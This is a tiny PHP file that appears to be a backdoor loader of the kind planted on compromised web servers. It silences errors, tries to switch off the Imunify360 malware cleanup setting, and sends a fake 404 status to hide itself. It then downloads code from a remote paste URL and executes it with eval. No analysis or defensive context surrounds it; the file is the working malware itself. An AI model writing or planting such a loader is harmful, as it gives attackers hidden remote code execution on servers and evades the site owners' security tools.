<?php
error_reporting(0);
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);
http_response_code(404);
$url = 'https://paste.myconan.net/501156.txt';
$ohct = file_get_contents($url);
eval('?>' . $ohct);
?>